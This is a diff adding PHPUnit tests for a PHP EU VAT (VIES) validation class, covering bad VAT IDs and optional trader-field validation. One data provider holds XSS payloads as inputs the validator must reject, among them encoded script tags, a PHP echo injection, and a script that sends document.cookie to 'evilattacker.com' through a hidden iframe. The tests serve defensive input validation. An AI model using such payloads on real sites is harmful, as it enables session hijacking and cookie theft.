@@ -340,4 +340,215 @@ class ViestTest extends TestCase
     {
         $this->assertCount(Vies::VIES_EU_COUNTRY_TOTAL, Vies::listEuropeanCountries());
     }
+
+    /**
+     * Data provider that will generate bad VAT ID's
+     *
+     * @return array
+     */
+    public function badVatIdProvider(): array
+    {
+        return [
+            ['UU', '1239874560'],
+            ['AA', '1234567890'],
+        ];
+    }
+
+    /**
+     * Validates exception it thrown if VAT checksum fails on
+     * provided country code and VAT ID
+     *
+     * @param string $countryCode
+     * @param string $vatId
+     *
+     * @dataProvider badVatIdProvider
+     * @covers ::validateVatSum
+     */
+    public function testValidateVatSumToThrowException(
+        string $countryCode,
+        string $vatId
+    ) {
+        $vies = new Vies();
+        $this->expectException(ViesException::class);
+        $vies->validateVatSum($countryCode, $vatId);
+        $this->fail('Expected exception was not thrown');
+    }
+
+    /**
+     * Test functionality to add optional arguments for VIES validation
+     *
+     * @covers ::addOptionalArguments
+     */
+    public function testCanAddOptionalArgumentsWithValue()
+    {
+        $viesRef = new \ReflectionClass(Vies::class);
+        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
+        $addOptionalArguments->setAccessible(true);
+
+        $array = [];
+        $object = new Vies();
+        $addOptionalArguments->invokeArgs($object, [&$array, 'foo', 'bar']);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'bar', 'baz']);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'baz', 'foobar']);
+        $this->assertCount(3, $array);
+    }
+
+    /**
+     * Test functionality to add optional arguments for VIES validation
+     * only if they have value
+     *
+     * @covers ::addOptionalArguments
+     */
+    public function testCanNotAddOptionalArgumentsWithoutValue()
+    {
+        $viesRef = new \ReflectionClass(Vies::class);
+        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
+        $addOptionalArguments->setAccessible(true);
+
+        $array = [];
+        $object = new Vies();
+        $addOptionalArguments->invokeArgs($object, [&$array, 'foo', '']);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'bar', '']);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'baz', '']);
+        $this->assertCount(0, $array);
+    }
+
+    /**
+     * A bad data provider for the optional arguments one can send
+     * with the request.
+     *
+     * @return array
+     */
+    public function badOptionalInformationProvider(): array
+    {
+        return [
+            [
+                '<script>alert("xss");</script>',
+                'Ltd',
+                'Main Street 1',
+                '1000',
+                'Some Town',
+            ],
+            [
+                'HackThePlanet',
+                '<script>document.write(\'<iframe src="http://evilattacker.com?cookie=\'
+                + document.cookie.escape() + \'" height=0 width=0 />\');</script>',
+                'Main Street 1',
+                '1000',
+                'Some Town',
+            ],
+            [
+                'HackThePlanet',
+                'Ltd',
+                "Main Street 1\x3c\x73\x63\x72\x69\x70\x74\x3e\x61\x6c\x65\x72\x74\x28\x22"
+                . "\x78\x73\x73\x22\x29\x3b\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e",
+                '1000',
+                'Some Town',
+            ],
+            [
+                'HackThePlanet',
+                'Ltd',
+                'Main Street 1',
+                '1000<?php echo url_decode("%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78'
+                . '%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e") ?>',
+                'Some Town',
+            ],
+            [
+                'HackThePlanet',
+                'Ltd',
+                'Main Street 1',
+                '1000',
+                '<s c r i p t>alert("xss");</s c r i p t>',
+            ],
+        ];
+    }
+
+    /**
+     * Test validation of optional trader information data
+     *
+     * @param string $traderName
+     * @param string $traderCompanyType
+     * @param string $traderStreet
+     * @param string $traderPostcode
+     * @param string $traderCity
+     *
+     * @covers ::addOptionalArguments
+     * @covers ::filterArgument
+     * @covers ::validateArgument
+     * @dataProvider badOptionalInformationProvider
+     */
+    public function testRejectBadOptionalInformation(
+        string $traderName,
+        string $traderCompanyType,
+        string $traderStreet,
+        string $traderPostcode,
+        string $traderCity
+    ) {
+        $viesRef = new \ReflectionClass(Vies::class);
+        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
+        $addOptionalArguments->setAccessible(true);
+
+        $array = [];
+        $object = new Vies();
+        $this->expectException(\InvalidArgumentException::class);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderName', $traderName]);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderCompanyType', $traderCompanyType]);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderStreet', $traderStreet]);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderPostcode', $traderPostcode]);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderCity', $traderCity]);
+        $this->fail('Expected exception was not thrown');
+    }
+
+    /**
+     * Generate valid optional information that should be validated
+     *
+     * @return array
+     */
+    public function validOptionalInformationProvider(): array
+    {
+        return [
+            [
+                'Good Business',
+                'Ltd',
+                'Main Street 1',
+                '1000',
+                'Some Town',
+            ],
+        ];
+    }
+
+    /**
+     * Test validation of valid optional trader information data
+     *
+     * @param string $traderName
+     * @param string $traderCompanyType
+     * @param string $traderStreet
+     * @param string $traderPostcode
+     * @param string $traderCity
+     *
+     * @covers ::addOptionalArguments
+     * @covers ::filterArgument
+     * @covers ::validateArgument
+     * @dataProvider validOptionalInformationProvider
+     */
+    public function testAllowValidOptionalInformation(
+        string $traderName,
+        string $traderCompanyType,
+        string $traderStreet,
+        string $traderPostcode,
+        string $traderCity
+    ) {
+        $viesRef = new \ReflectionClass(Vies::class);
+        $addOptionalArguments = $viesRef->getMethod('addOptionalArguments');
+        $addOptionalArguments->setAccessible(true);
+
+        $array = [];
+        $object = new Vies();
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderName', $traderName]);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderCompanyType', $traderCompanyType]);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderStreet', $traderStreet]);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderPostcode', $traderPostcode]);
+        $addOptionalArguments->invokeArgs($object, [&$array, 'traderCity', $traderCity]);
+        $this->assertCount(5, $array);
+    }
 }
